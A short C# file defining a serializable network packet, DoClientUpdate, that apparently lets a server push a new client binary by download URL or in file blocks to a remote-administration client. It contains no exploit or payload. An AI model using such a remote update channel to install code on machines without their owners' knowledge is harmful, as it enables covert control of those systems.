using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoClientUpdate : IPacket
    {
        public int ID { get; set; }

        public string DownloadURL { get; set; }

        public string FileName { get; set; }

        public byte[] Block { get; set; }

        public int MaxBlocks { get; set; }

        public int CurrentBlock { get; set; }

        public DoClientUpdate()
        {
        }

        public DoClientUpdate(int id, string downloadurl, string filename, byte[] block, int maxblocks, int currentblock)
        {
            this.ID = id;
            this.DownloadURL = downloadurl;
            this.FileName = filename;
            this.Block = block;
            this.MaxBlocks = maxblocks;
            this.CurrentBlock = currentblock;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}